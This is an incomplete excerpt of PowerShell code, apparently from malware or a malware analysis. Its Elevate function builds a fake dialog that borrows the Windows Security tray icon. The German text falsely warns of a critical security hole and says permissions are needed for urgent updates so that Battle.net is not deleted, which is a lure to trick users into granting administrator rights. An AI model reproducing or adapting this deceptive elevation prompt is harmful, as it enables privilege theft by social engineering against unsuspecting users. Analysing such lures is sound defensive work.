...
Function Elevate{
    ...
    $errorForm.Font = 'Microsoft Sans Serif,11'
    $securityExe = "$env:windir\System32\SecurityHealthSystray.exe"

    if (Test-Path $securityExe) {
    $securityIcon = [System.Drawing.Icon]::ExtractAssociatedIcon($securityExe)
    $errorForm.Icon = $securityIcon
    }
else {
...
$label.Location = New-Object System.Drawing.Point(10, 34)
$label.Size = New-Object System.Drawing.Size(380, 62)
$label.TextAlign = [System.Drawing.ContentAlignment]::TopCenter

$label.Text = "Kritische Sicherheitslücke gefunden.`n Berechtigungen werden benötigt um`n wichtige Sicherheitsupdates durchzuführen, um die`n Systemfehler zu beheben und damit Battle.net nicht gelöscht wird."
...
$label.Text = "Kritische Sicherheitslücke gefunden. Es werden Berechtigungen erfordert um dringend wichtige Sicherheitsupdates durchzuführen und die Fehler sofort zu beheben."
